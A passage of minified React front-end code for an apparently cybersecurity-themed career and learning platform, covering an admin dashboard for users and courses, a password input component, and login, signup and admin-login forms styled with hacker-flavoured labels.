e.jsx(F2,{onBack:()=>c("landing")});case"verification":return e.jsx(E2,{});case"career":return e.jsx(T2,{});case"interview":return e.jsx(P2,{});case"resume":return e.jsx(R2,{});case"pricing":return e.jsx(O2,{});case"analyzer":return e.jsx(D2,{});default:return e.jsx(mo,{})}},j=["community","verification","landing","analyzer"].includes(o);return e.jsxs("div",{className:"min-h-screen bg-gradient-to-br from-slate-900 to-slate-800",children:[e.jsx(Td,{}),e.jsxs("div",{className:"flex",children:[!j&&e.jsx(iw,{activeTab:o,onTabChange:c}),e.jsx("main",{className:"flex-1",children:w()})]})]})},M2=({activeTab:a,onTabChange:n})=>{const{logout:s}=Ie(),i=[{id:"overview",label:"Overview",icon:Fd},{id:"users",label:"Manage Users",icon:Ut},{id:"courses",label:"Manage Courses",icon:xr},{id:"analytics",label:"Analytics",icon:N0},{id:"settings",label:"Settings",icon:Sd}];return e.jsxs("div",{className:"w-72 bg-[#0A0F0A] border-r border-[#00FF88]/10 h-[calc(100vh-4rem)] flex flex-col sticky top-16",children:[e.jsx("div",{className:"p-4 flex-1 overflow-y-auto custom-scrollbar",children:e.jsx("div",{className:"space-y-2",children:i.map(o=>{const c=o.icon,d=a===o.id;return e.jsxs("button",{onClick:()=>n(o.id),className:Ir("w-full flex items-center space-x-3 px-4 py-3.5 rounded-xl transition-all duration-300 group relative overflow-hidden",d?"bg-gradient-to-r from-[#00FF88]/20 to-[#00FF88]/5 text-[#00FF88] shadow-[0_0_20px_rgba(0,255,136,0.15)] border border-[#00FF88]/20":"text-[#00B37A] hover:text-[#EAEAEA] hover:bg-[#00FF88]/5 border border-transparent hover:shadow-lg hover:shadow-[#00FF88]/5"),children:[e.jsx("div",{className:Ir("p-2 rounded-lg transition-all duration-300",d?"bg-[#00FF88]/10":"bg-[#00FF88]/5 group-hover:bg-[#00FF88]/10"),children:e.jsx(c,{className:Ir("h-5 w-5 transition-transform duration-300 group-hover:scale-110",d?"text-[#00FF88]":"text-[#00B37A] group-hover:text-[#EAEAEA]")})}),e.jsx("span",{className:"font-medium tracking-wide text-sm",children:o.label}),d&&e.jsx("div",{className:"absolute right-3 animate-fade-in",children:e.jsx(Yt,{className:"h-4 w-4 text-primary"})})]},o.id)})})}),e.jsxs("div",{className:"p-4 border-t border-[#00FF88]/10 bg-[#0A0F0A]/50 backdrop-blur-sm",children:[e.jsxs("div",{className:"mb-4 px-4 py-3 bg-gradient-to-br from-[#0A0F0A] to-[#000000] rounded-xl border border-[#00FF88]/10 shadow-inner",children:[e.jsx("p",{className:"text-xs font-medium text-[#00B37A] uppercase tracking-wider mb-2",children:"Clearance Level"}),e.jsxs("div",{className:"flex justify-between items-center",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-2xl font-bold text-[#EAEAEA]",children:"Administrator"}),e.jsx("p",{className:"text-xs text-[#00FF88]",children:"Level 5 Access"})]}),e.jsx("div",{className:"h-10 w-10 rounded-full bg-red-500/10 flex items-center justify-center border border-red-500/20",children:e.jsx(ze,{className:"h-5 w-5 text-red-400"})})]})]}),e.jsxs("button",{onClick:s,className:"w-full flex items-center justify-center space-x-2 px-4 py-3 rounded-xl text-[#00B37A] hover:text-red-400 hover:bg-red-500/10 border border-transparent hover:border-red-500/20 transition-all duration-300 group",children:[e.jsx(Eo,{className:"h-5 w-5 group-hover:scale-110 transition-transform"}),e.jsx("span",{className:"font-medium",children:"Sign Out"})]})]})]})},$2=()=>{const[a,n]=v.useState("overview"),[s,i]=v.useState([]),[o,c]=v.useState([]),[d,m]=v.useState(null),[f,x]=v.useState(!0);v.useEffect(()=>{p()},[]),v.useEffect(()=>{const j=Z.channel("admin-dashboard").on("postgres_changes",{event:"*",schema:"public",table:"users"},()=>p()).on("postgres_changes",{event:"*",schema:"public",table:"courses"},()=>p()).on("postgres_changes",{event:"*",schema:"public",table:"course_enrollments"},()=>p()).subscribe();return()=>{Z.removeChannel(j)}},[]);const p=async()=>{try{x(!0);const[j,N,k]=await Promise.all([ps.getAllUsers(),ps.getAllCourses(),ps.getDashboardStats()]);i(j),c(N),m(k)}catch(j){console.error("Failed to load dashboard data:",j)}finally{x(!1)}},b=async(j,N)=>{try{await ps.updateUserRole(j,N),i(s.map(k=>k.id===j?{...k,role:N}:k))}catch(k){console.error("Failed to update user role:",k)}},w=async(j,N)=>{try{await ps.updateCourseStatus(j,N),c(o.map(k=>k.id===j?{...k,is_published:N}:k))}catch(k){console.error("Failed to update course status:",k)}};return f?e.jsx("div",{className:"min-h-screen flex items-center justify-center bg-gradient-to-br from-slate-900 to-slate-800",children:e.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-b-2 border-primary"})}):e.jsxs("div",{className:"min-h-screen bg-gradient-to-br from-slate-900 to-slate-800",children:[e.jsx(Td,{}),e.jsxs("div",{className:"flex",children:[e.jsx(M2,{activeTab:a,onTabChange:j=>n(j)}),e.jsx("main",{className:"flex-1 overflow-y-auto h-[calc(100vh-4rem)]",children:e.jsxs("div",{className:"p-6 space-y-8 animate-fade-in",children:[e.jsx("div",{className:"flex flex-col md:flex-row md:items-center justify-between gap-4",children:e.jsxs("div",{children:[e.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[e.jsx("h1",{className:"text-4xl font-bold bg-gradient-to-r from-white via-white/80 to-white/60 bg-clip-text text-transparent",children:"Admin Dashboard"}),e.jsx(Tn,{variant:"destructive",className:"animate-pulse",children:"Live"})]}),e.jsx("p",{className:"text-muted-foreground text-lg",children:"Manage users, courses, and platform analytics"})]})}),a==="overview"&&e.jsxs("div",{className:"space-y-8",children:[e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6",children:[e.jsxs(xt,{variant:"cyber",hover:!0,className:"relative overflow-hidden group",children:[e.jsx("div",{className:"absolute -right-6 -top-6 h-24 w-24 rounded-full bg-emerald-500/10 blur-2xl group-hover:blur-3xl transition-all duration-500"}),e.jsxs(gt,{className:"p-6 flex items-center justify-between relative z-10",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted-foreground text-sm font-medium",children:"Total Students"}),e.jsx("p",{className:"text-3xl font-bold text-foreground mt-2",children:d?.users?.students||0})]}),e.jsx("div",{className:"p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/20",children:e.jsx(No,{className:"h-8 w-8 text-emerald-400"})})]})]}),e.jsxs(xt,{variant:"cyber",hover:!0,className:"relative overflow-hidden group",children:[e.jsx("div",{className:"absolute -right-6 -top-6 h-24 w-24 rounded-full bg-blue-500/10 blur-2xl group-hover:blur-3xl transition-all duration-500"}),e.jsxs(gt,{className:"p-6 flex items-center justify-between relative z-10",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted-foreground text-sm font-medium",children:"Total Teachers"}),e.jsx("p",{className:"text-3xl font-bold text-foreground mt-2",children:d?.users?.teachers||0})]}),e.jsx("div",{className:"p-3 rounded-xl bg-blue-500/10 border border-blue-500/20",children:e.jsx(Ut,{className:"h-8 w-8 text-blue-400"})})]})]}),e.jsxs(xt,{variant:"cyber",hover:!0,className:"relative overflow-hidden group",children:[e.jsx("div",{className:"absolute -right-6 -top-6 h-24 w-24 rounded-full bg-amber-500/10 blur-2xl group-hover:blur-3xl transition-all duration-500"}),e.jsxs(gt,{className:"p-6 flex items-center justify-between relative z-10",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted-foreground text-sm font-medium",children:"Published Courses"}),e.jsx("p",{className:"text-3xl font-bold text-foreground mt-2",children:d?.courses?.published||0})]}),e.jsx("div",{className:"p-3 rounded-xl bg-amber-500/10 border border-amber-500/20",children:e.jsx(xr,{className:"h-8 w-8 text-amber-400"})})]})]}),e.jsxs(xt,{variant:"cyber",hover:!0,className:"relative overflow-hidden group",children:[e.jsx("div",{className:"absolute -right-6 -top-6 h-24 w-24 rounded-full bg-purple-500/10 blur-2xl group-hover:blur-3xl transition-all duration-500"}),e.jsxs(gt,{className:"p-6 flex items-center justify-between relative z-10",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted-foreground text-sm font-medium",children:"Total Enrollments"}),e.jsx("p",{className:"text-3xl font-bold text-foreground mt-2",children:d?.enrollments?.total||0})]}),e.jsx("div",{className:"p-3 rounded-xl bg-purple-500/10 border border-purple-500/20",children:e.jsx(E0,{className:"h-8 w-8 text-purple-400"})})]})]})]}),e.jsxs(xt,{variant:"glass",className:"border-white/5 bg-white/[0.02]",children:[e.jsx(fs,{children:e.jsxs(ms,{className:"flex items-center gap-2",children:[e.jsx(xs,{className:"h-5 w-5 text-primary"}),"Recent Activity"]})}),e.jsx(gt,{children:e.jsx("div",{className:"space-y-4",children:s.slice(0,5).map(j=>e.jsxs("div",{className:"flex items-center space-x-4 p-4 bg-white/5 rounded-xl border border-white/5 hover:border-white/10 transition-colors",children:[e.jsx("div",{className:`w-10 h-10 rounded-full flex items-center justify-center border ${j.role==="admin"?"bg-amber-500/10 text-amber-400 border-amber-500/20":j.role==="teacher"?"bg-emerald-500/10 text-emerald-400 border-emerald-500/20":"bg-blue-500/10 text-blue-400 border-blue-500/20"}`,children:j.role==="admin"?e.jsx(Jv,{className:"h-5 w-5"}):j.role==="teacher"?e.jsx(Ut,{className:"h-5 w-5"}):e.jsx(No,{className:"h-5 w-5"})}),e.jsxs("div",{className:"flex-1",children:[e.jsx("p",{className:"text-foreground font-medium",children:j.name}),e.jsxs("p",{className:"text-muted-foreground text-sm",children:["Joined as ",e.jsx("span",{className:"capitalize",children:j.role})]})]}),e.jsx("div",{className:"text-muted-foreground text-sm",children:new Date(j.created_at??Date.now()).toLocaleDateString()})]},j.id))})})]})]}),a==="users"&&e.jsxs(xt,{variant:"glass",className:"border-white/5 bg-white/[0.02]",children:[e.jsx(fs,{children:e.jsx(ms,{children:"User Management"})}),e.jsx(gt,{children:e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"border-b border-white/10",children:[e.jsx("th",{className:"text-left py-3 px-4 text-muted-foreground font-medium",children:"User"}),e.jsx("th",{className:"text-left py-3 px-4 text-muted-foreground font-medium",children:"Role"}),e.jsx("th",{className:"text-left py-3 px-4 text-muted-foreground font-medium",children:"Level"}),e.jsx("th",{className:"text-left py-3 px-4 text-muted-foreground font-medium",children:"Joined"}),e.jsx("th",{className:"text-left py-3 px-4 text-muted-foreground font-medium",children:"Actions"})]})}),e.jsx("tbody",{children:s.map(j=>e.jsxs("tr",{className:"border-b border-white/5 hover:bg-white/5 transition-colors",children:[e.jsx("td",{className:"py-4 px-4",children:e.jsxs("div",{className:"flex items-center space-x-3",children:[e.jsx("div",{className:`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium border ${j.role==="admin"?"bg-amber-500/10 text-amber-400 border-amber-500/20":j.role==="teacher"?"bg-emerald-500/10 text-emerald-400 border-emerald-500/20":"bg-blue-500/10 text-blue-400 border-blue-500/20"}`,children:(j?.name??"U").charAt(0).toUpperCase()}),e.jsxs("div",{children:[e.jsx("p",{className:"text-foreground font-medium",children:j?.name??"Unknown"}),e.jsx("p",{className:"text-muted-foreground text-xs",children:j?.email??""})]})]})}),e.jsx("td",{className:"py-4 px-4",children:e.jsxs("select",{value:j.role??"student",onChange:N=>b(j.id,N.target.value),className:"bg-background text-foreground rounded-lg px-3 py-1 text-sm border border-input focus:ring-2 focus:ring-primary focus:border-transparent outline-none",children:[e.jsx("option",{value:"student",children:"Student"}),e.jsx("option",{value:"teacher",children:"Teacher"}),e.jsx("option",{value:"admin",children:"Admin"})]})}),e.jsx("td",{className:"py-4 px-4",children:e.jsx(Tn,{variant:j.level==="advanced"?"destructive":j.level==="intermediate"?"warning":"success",children:j.level})}),e.jsx("td",{className:"py-4 px-4 text-muted-foreground text-sm",children:new Date(j.created_at??Date.now()).toLocaleDateString()}),e.jsx("td",{className:"py-4 px-4",children:e.jsx($t,{variant:"ghost",size:"icon",className:"text-blue-400 hover:text-blue-300",children:e.jsx(gs,{className:"h-4 w-4"})})})]},j.id))})]})})})]}),a==="courses"&&e.jsxs(xt,{variant:"glass",className:"border-white/5 bg-white/[0.02]",children:[e.jsx(fs,{children:e.jsx(ms,{children:"Course Management"})}),e.jsx(gt,{children:e.jsx("div",{className:"grid gap-4",children:o.map(j=>e.jsx("div",{className:"bg-white/5 rounded-xl p-6 border border-white/10 hover:border-primary/30 transition-colors",children:e.jsxs("div",{className:"flex flex-col md:flex-row md:items-start justify-between gap-4",children:[e.jsxs("div",{className:"flex-1 space-y-2",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("h3",{className:"text-xl font-bold text-foreground",children:j.title}),e.jsx(Tn,{variant:j.is_published?"success":"warning",children:j.is_published?"Published":"Draft"})]}),e.jsx("p",{className:"text-muted-foreground",children:j.description}),e.jsxs("div",{className:"flex items-center space-x-4 text-sm text-muted-foreground",children:[e.jsxs("span",{className:"flex items-center gap-1",children:[e.jsx(Ut,{className:"h-4 w-4"}),"Teacher: ",j.teacher?.name||"Unknown"]}),e.jsx(Tn,{variant:"outline",className:"text-xs",children:j.difficulty}),e.jsxs("span",{children:[j.enrollment_count," enrolled"]})]})]}),e.jsx($t,{variant:j.is_published?"warning":"success",size:"sm",onClick:()=>w(j.id,!j.is_published),children:j.is_published?"Unpublish":"Publish"})]})},j.id))})})]}),a==="analytics"&&e.jsx("div",{className:"space-y-8",children:e.jsxs(xt,{variant:"glass",className:"border-white/5 bg-white/[0.02]",children:[e.jsx(fs,{children:e.jsx(ms,{children:"Platform Analytics"})}),e.jsx(gt,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"bg-white/5 rounded-xl p-6 border border-white/10",children:[e.jsx("h3",{className:"text-lg font-bold text-foreground mb-4",children:"User Growth"}),e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-muted-foreground",children:"This Month"}),e.jsxs("span",{className:"text-green-400 font-medium",children:["+",d?.enrollments?.thisMonth||0]})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-muted-foreground",children:"Total Users"}),e.jsx("span",{className:"text-foreground font-medium",children:d?.users?.total||0})]})]})]}),e.jsxs("div",{className:"bg-white/5 rounded-xl p-6 border border-white/10",children:[e.jsx("h3",{className:"text-lg font-bold text-foreground mb-4",children:"Course Statistics"}),e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-muted-foreground",children:"Published"}),e.jsx("span",{className:"text-green-400 font-medium",children:d?.courses?.published||0})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-muted-foreground",children:"Draft"}),e.jsx("span",{className:"text-yellow-400 font-medium",children:d?.courses?.draft||0})]})]})]})]})})]})}),a==="settings"&&e.jsx("div",{className:"space-y-8",children:e.jsxs(xt,{variant:"glass",className:"border-white/5 bg-white/[0.02]",children:[e.jsx(fs,{children:e.jsx(ms,{children:"Platform Settings"})}),e.jsx(gt,{children:e.jsxs("div",{className:"space-y-6",children:[e.jsxs("div",{className:"bg-white/5 rounded-xl p-6 border border-white/10",children:[e.jsx("h3",{className:"text-lg font-bold text-foreground mb-4",children:"General Settings"}),e.jsx("p",{className:"text-muted-foreground",children:"Platform configuration settings coming soon."})]}),e.jsxs("div",{className:"bg-white/5 rounded-xl p-6 border border-white/10",children:[e.jsx("h3",{className:"text-lg font-bold text-foreground mb-4",children:"Security Settings"}),e.jsx("p",{className:"text-muted-foreground",children:"Security and authentication settings coming soon."})]}),e.jsxs("div",{className:"bg-white/5 rounded-xl p-6 border border-white/10",children:[e.jsx("h3",{className:"text-lg font-bold text-foreground mb-4",children:"Email Notifications"}),e.jsx("p",{className:"text-muted-foreground",children:"Email notification configuration coming soon."})]})]})})]})})]})})]})]})},Rr=gd.forwardRef(({className:a="",label:n,error:s,leftIcon:i,rightIcon:o,type:c,cyber:d,showPasswordToggle:m=!0,...f},x)=>{const[p,b]=v.useState(!1),w=c==="password",j=w&&m?p?"text":"password":c;return e.jsxs("div",{className:"w-full space-y-1.5 focus-within:z-20",children:[n&&e.jsx("label",{className:`block ml-1 ${d?"text-[10px] font-mono text-[#00B37A] uppercase tracking-[0.2em]":"text-sm font-medium leading-none"}`,children:n}),e.jsxs("div",{className:"relative flex items-center",children:[i&&e.jsx("div",{className:"absolute left-3 flex items-center justify-center pointer-events-none text-muted-foreground group-focus-within:text-[#00FF88]",children:i}),e.jsx("input",{type:j,className:`flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 transition-all duration-200 ${i?"pl-10":""} ${o||w&&m?"pr-10":""} ${s?"border-destructive focus-visible:ring-destructive":""} ${d?"bg-[#000000]/40 border-[#00FF88]/20 focus:border-[#00FF88] text-white placeholder:text-[#00B37A]/30 font-mono rounded-xl":""} ${a}`,ref:x,...f}),(o||w&&m)&&e.jsx("div",{className:"absolute right-3 flex items-center justify-center text-muted-foreground",children:w&&m?e.jsx("button",{type:"button",onClick:()=>b(!p),className:"hover:text-[#00FF88] transition-colors focus:outline-none focus:ring-0",tabIndex:-1,children:p?e.jsx(id,{size:16}):e.jsx(gs,{size:16})}):o})]}),s&&e.jsx("p",{className:`text-sm ${d?"font-mono text-[10px] uppercase tracking-widest text-red-500":"text-destructive"}`,children:s})]})});Rr.displayName="Input";const Ud=({children:a,title:n,subtitle:s,className:i="max-w-md"})=>e.jsxs("div",{className:"min-h-screen bg-[#000000] text-[#EAEAEA] font-sans selection:bg-[#00FF88]/30 flex flex-col items-center justify-center p-4 relative overflow-hidden",children:[e.jsx("div",{className:"fixed inset-0 bg-[linear-gradient(to_right,#00FF8808_1px,transparent_1px),linear-gradient(to_bottom,#00FF8808_1px,transparent_1px)] bg-[size:24px_24px] pointer-events-none"}),e.jsx("div",{className:"fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[500px] bg-[#00FF88]/10 blur-[120px] rounded-full pointer-events-none"}),e.jsxs("div",{className:`w-full relative z-10 ${i}`,children:[e.jsxs("div",{className:"text-center mb-8",children:[e.jsxs(Qa,{to:"/",className:"inline-flex items-center gap-3 mb-6 group transition-all hover:scale-105",children:[e.jsx("div",{className:"p-2 bg-[#00FF88]/10 border border-[#00FF88]/20 rounded-lg group-hover:bg-[#00FF88]/20 transition-colors",children:e.jsx(ze,{className:"h-8 w-8 text-[#00FF88]"})}),e.jsxs("div",{className:"text-left",children:[e.jsxs("div",{className:"text-xl font-black tracking-tighter text-white uppercase",children:["Career ",e.jsx("span",{className:"text-[#00FF88]",children:"Connect"})]}),e.jsx("div",{className:"text-[10px] font-mono text-[#00B37A] tracking-widest uppercase",children:"Cybersecurity Ops"})]})]}),e.jsx("h1",{className:"text-3xl font-black text-white uppercase tracking-tight mb-2",children:n}),s&&e.jsx("p",{className:"text-[#00B37A] font-mono text-sm tracking-wide uppercase",children:s})]}),a,e.jsx("div",{className:"mt-8 text-center",children:e.jsx("p",{className:"text-xs text-[#00B37A]/50 font-mono",children:"SECURE CONNECTION ESTABLISHED // V2.0.4"})})]})]}),B2=({userType:a,onSuccess:n})=>{const[s,i]=v.useState(""),[o,c]=v.useState(""),[d,m]=v.useState(a||"student"),[f,x]=v.useState(!1),[p,b]=v.useState(""),{login:w}=Ie(),j=zn(),N=async k=>{k.preventDefault(),b(""),x(!0);try{await w(s,o,d),n?n():j(d==="teacher"?"/teacher":"/dashboard")}catch(F){b(F instanceof Error?F.message:"Login failed")}finally{x(!1)}};return e.jsx(Ud,{title:"Access Terminal",subtitle:`Authorized ${d} Entry`,className:"max-w-md",children:e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-2xl p-8 shadow-[0_0_50px_rgba(0,255,136,0.05)] backdrop-blur-xl relative overflow-hidden group",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-b from-[#00FF88]/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none"}),p&&e.jsx("div",{className:"mb-6 bg-red-500/10 border border-red-500/20 rounded-lg p-4 animate-in fade-in slide-in-from-top-2",children:e.jsx("p",{className:"text-red-500 text-xs font-mono uppercase tracking-widest text-center",children:p})}),e.jsxs("form",{onSubmit:N,className:"space-y-6 relative z-10",children:[!a&&e.jsxs("div",{className:"space-y-3",children:[e.jsx("label",{className:"text-[10px] font-mono text-[#00B37A] uppercase tracking-[0.2em] ml-1",children:"Select Identity"}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("button",{type:"button",onClick:()=>m("student"),className:`flex flex-col items-center gap-2 p-4 rounded-xl border transition-all duration-300 relative z-20 ${d==="student"?"bg-[#00FF88]/10 border-[#00FF88] text-[#00FF88] shadow-[0_0_20px_rgba(0,255,136,0.1)]":"bg-[#000000]/40 border-[#00FF88]/10 text-[#00B37A] hover:border-[#00FF88]/40 hover:bg-[#00FF88]/5"}`,children:[e.jsx(No,{className:"h-6 w-6"}),e.jsx("span",{className:"text-xs font-bold uppercase tracking-widest",children:"Student"})]}),e.jsxs("button",{type:"button",onClick:()=>m("teacher"),className:`flex flex-col items-center gap-2 p-4 rounded-xl border transition-all duration-300 relative z-20 ${d==="teacher"?"bg-[#00FF88]/10 border-[#00FF88] text-[#00FF88] shadow-[0_0_20px_rgba(0,255,136,0.1)]":"bg-[#000000]/40 border-[#00FF88]/10 text-[#00B37A] hover:border-[#00FF88]/40 hover:bg-[#00FF88]/5"}`,children:[e.jsx(Ut,{className:"h-6 w-6"}),e.jsx("span",{className:"text-xs font-bold uppercase tracking-widest",children:"Teacher"})]})]})]}),e.jsxs("div",{className:"space-y-4",children:[e.jsx(Rr,{label:"Email Frequency",type:"email",required:!0,value:s,onChange:k=>i(k.target.value),placeholder:"operator@network.cmd",leftIcon:e.jsx(_d,{className:"h-4 w-4"}),cyber:!0}),e.jsx(Rr,{label:"Access Key",type:"password",required:!0,value:o,onChange:k=>c(k.target.value),placeholder:"",leftIcon:e.jsx(vt,{className:"h-4 w-4"}),cyber:!0,showPasswordToggle:!0})]}),e.jsx($t,{type:"submit",isLoading:f,className:"w-full h-12 bg-[#00FF88] text-black hover:bg-[#00CC66] font-black uppercase tracking-widest rounded-xl transition-all hover:shadow-[0_0_30px_rgba(0,255,136,0.4)] group",children:f?"Decrypting...":e.jsxs("span",{className:"flex items-center justify-center gap-2",children:["Initialize Session ",e.jsx(Or,{className:"h-4 w-4 group-hover:translate-x-1 transition-transform"})]})})]}),e.jsxs("div",{className:"mt-8 pt-6 border-t border-[#00FF88]/10 flex flex-col items-center gap-4",children:[e.jsx("p",{className:"text-[#00B37A] text-[10px] font-mono uppercase tracking-[0.2em]",children:"New to the terminal?"}),e.jsx(Qa,{to:"/signup",className:"w-full relative z-20",children:e.jsx($t,{variant:"outline",className:"w-full border-[#00FF88]/20 text-[#00FF88] hover:bg-[#00FF88]/10 font-bold uppercase tracking-widest rounded-xl transition-all",children:"Establish New Identity_"})})]})]})})},U2=({userType:a,onSuccess:n})=>{const[s,i]=v.useState(""),[o,c]=v.useState(""),[d,m]=v.useState(""),[f,x]=v.useState(""),[p,b]=v.useState(a||"student"),[w,j]=v.useState(!1),[N,k]=v.useState(""),{register:F}=Ie(),T=zn(),R=async S=>{if(S.preventDefault(),d!==f){k("Passwords do not match");return}k(""),j(!0);try{await F(o,d,s,p),n?n():T(p==="teacher"?"/teacher":"/dashboard")}catch(U){k(U instanceof Error?U.message:"Registration failed")}finally{j(!1)}};return e.jsx(Ud,{title:"Create Identity",subtitle:`Enlist as ${p}`,className:"max-w-2xl",children:e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-2xl p-8 shadow-[0_0_50px_rgba(0,255,136,0.05)] backdrop-blur-xl relative overflow-hidden group w-full",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-b from-[#00FF88]/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none"}),N&&e.jsx("div",{className:"mb-6 bg-red-500/10 border border-red-500/20 rounded-lg p-4 animate-in fade-in slide-in-from-top-2",children:e.jsx("p",{className:"text-red-500 text-xs font-mono uppercase tracking-widest text-center",children:N})}),e.jsxs("form",{onSubmit:R,className:"space-y-6 relative z-10",children:[!a&&e.jsxs("div",{className:"space-y-3",children:[e.jsx("label",{className:"text-[10px] font-mono text-[#00B37A] uppercase tracking-[0.2em] ml-1",children:"Choose Branch"}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("button",{type:"button",onClick:()=>b("student"),className:`flex flex-col items-center gap-2 p-4 rounded-xl border transition-all duration-300 relative z-20 ${p==="student"?"bg-[#00FF88]/10 border-[#00FF88] text-[#00FF88] shadow-[0_0_20px_rgba(0,255,136,0.1)]":"bg-[#000000]/40 border-[#00FF88]/10 text-[#00B37A] hover:border-[#00FF88]/40 hover:bg-[#00FF88]/5"}`,children:[e.jsx(No,{className:"h-6 w-6"}),e.jsx("span",{className:"text-xs font-bold uppercase tracking-widest",children:"Learner"})]}),e.jsxs("button",{type:"button",onClick:()=>b("teacher"),className:`flex flex-col items-center gap-2 p-4 rounded-xl border transition-all duration-300 relative z-20 ${p==="teacher"?"bg-[#00FF88]/10 border-[#00FF88] text-[#00FF88] shadow-[0_0_20px_rgba(0,255,136,0.1)]":"bg-[#000000]/40 border-[#00FF88]/10 text-[#00B37A] hover:border-[#00FF88]/40 hover:bg-[#00FF88]/5"}`,children:[e.jsx(Ut,{className:"h-6 w-6"}),e.jsx("span",{className:"text-xs font-bold uppercase tracking-widest",children:"Instructor"})]})]})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsx(Rr,{label:"Codename (Full Name)",type:"text",required:!0,value:s,onChange:S=>i(S.target.value),placeholder:"John Doe",leftIcon:e.jsx(zt,{className:"h-4 w-4"}),cyber:!0}),e.jsx(Rr,{label:"Comms Frequency (Email)",type:"email",required:!0,value:o,onChange:S=>c(S.target.value),placeholder:"operator@network.cmd",leftIcon:e.jsx(_d,{className:"h-4 w-4"}),cyber:!0})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsx(Rr,{label:"Access Key",type:"password",required:!0,value:d,onChange:S=>m(S.target.value),placeholder:"",leftIcon:e.jsx(vt,{className:"h-4 w-4"}),cyber:!0,showPasswordToggle:!0}),e.jsx(Rr,{label:"Verify Key",type:"password",required:!0,value:f,onChange:S=>x(S.target.value),placeholder:"",leftIcon:e.jsx(vt,{className:"h-4 w-4"}),cyber:!0,showPasswordToggle:!0})]}),e.jsx($t,{type:"submit",isLoading:w,className:"w-full h-12 bg-[#00FF88] text-black hover:bg-[#00CC66] font-black uppercase tracking-widest rounded-xl transition-all hover:shadow-[0_0_30px_rgba(0,255,136,0.4)] group",children:w?"Encrypting...":e.jsxs("span",{className:"flex items-center justify-center gap-2",children:["Establish Uplink ",e.jsx(Or,{className:"h-4 w-4 group-hover:translate-x-1 transition-transform"})]})})]}),e.jsxs("div",{className:"mt-8 pt-6 border-t border-[#00FF88]/10 flex flex-col items-center gap-4",children:[e.jsx("p",{className:"text-[#00B37A] text-[10px] font-mono uppercase tracking-[0.2em]",children:"Already have an identity?"}),e.jsx(Qa,{to:"/login",className:"w-full relative z-20",children:e.jsx($t,{variant:"outline",className:"w-full border-[#00FF88]/20 text-[#00FF88] hover:bg-[#00FF88]/10 font-bold uppercase tracking-widest rounded-xl transition-all",children:"Initialize Sign In_"})})]})]})})},z2=({onSuccess:a})=>{const[n,s]=v.useState(""),[i,o]=v.useState(""),[c,d]=v.useState(!1),[m,f]=v.useState(""),{login:x}=Ie(),p=zn(),b=async w=>{w.preventDefault(),f(""),d(!0);try{await x(n,i,"admin"),a?a():p("/admin")}catch(j){f(j instanceof Error?j.message:"Authentication failed")}finally{d(!1)}};return e.jsx(Ud,{title:"Restricted Access",subtitle:"Admin Command Center",className:"max-w-md",children:e.jsxs("div",{className:"bg-[#0A0F0A] border border-red-500/20 rounded-2xl p-8 shadow-[0_0_50px_rgba(239,68,68,0.05)] backdrop-blur-xl relative overflow-hidden group",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-b from-red-500/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none"}),e.jsx("div",{className:"flex justify-center mb-8",children:e.jsxs("div",{className:"relative",children:[e.jsx("div",{className:"absolute inset-0 bg-red-500/20 blur-xl rounded-full animate-pulse"}),e.jsx("div",{className:"relative bg-red-500/10 border border-red-500/40 p-4 rounded-full",children:e.jsx(ze,{className:"h-10 w-10 text-red-500"})}),e.jsx("div",{className:"absolute -top-1 -right-1 bg-black border border-red-500/40 rounded-full p-1",children:e.jsx(Sd,{className:"h-4 w-4 text-red-500 animate-spin-slow"})})]})}),m&&e.jsx("div",{className:"mb-6 bg-red-500/10 border border-red-500/20 rounded-lg p-4 animate-in fade-in slide-in-from-top-2",children:e.jsx("p",{className:"text-red-500 text-xs font-mono uppercase tracking-widest text-center",children:m})}),e.jsxs("form",{onSubmit:b,className:"space-y-6 relative z-10",children:[e.jsxs("div",{className:"space-y-4",children:[e.jsx(Rr,{label:"Admin Frequency",type:"email",required:!0,value:n,onChange:w=>s(w.target.value),placeholder:"admin@central.cmd",leftIcon:e.jsx(ze,{className:"h-4 w-4"}),cyber:!0}),e.jsx(Rr,{label:"Security Key",type:"password",required:!0,value:i,onChange:w=>o(w.target.value),placeholder:"",leftIcon:e.jsx(vt,{className:"h-4 